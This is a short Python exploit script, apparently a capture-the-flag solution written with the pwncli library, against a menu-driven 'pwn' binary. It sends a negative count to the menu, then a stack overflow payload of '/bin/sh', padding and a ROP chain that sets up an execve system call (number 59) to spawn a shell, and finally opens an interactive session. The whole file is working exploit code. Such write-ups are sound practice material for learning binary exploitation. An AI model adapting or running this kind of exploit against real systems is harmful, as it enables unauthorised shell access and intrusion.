#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
#  set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

def cmd(choice):
    ru(b'> ')
    sl(i2b(choice))
def pijiu(count):
    cmd(1)
    ru(b'3.')
    ru(b"\n")
    sl(i2b(1))
    ru(b'\n')
    sl(i2b(count))

syscall = 0x0000000000402404
pop_rdi_ret = 0x000000000040264f
name = 0x4E60F0
pop_rax_ret = 0x0000000000458827

pijiu(-100000)
cmd(4)
cmd(5)
ru(b'\n')
payload = b"/bin/sh\x00"
payload = payload.ljust(32+8, b"a")
payload += p64(pop_rdi_ret)
payload += p64(name)
payload += p64(0x000000000040a67e)
payload += p64(0)
payload += p64(0x00000000004a404b)
payload += p64(0)*2
payload += p64(pop_rax_ret)
payload += p64(59)
payload += p64(syscall)
sl(payload)


ia()
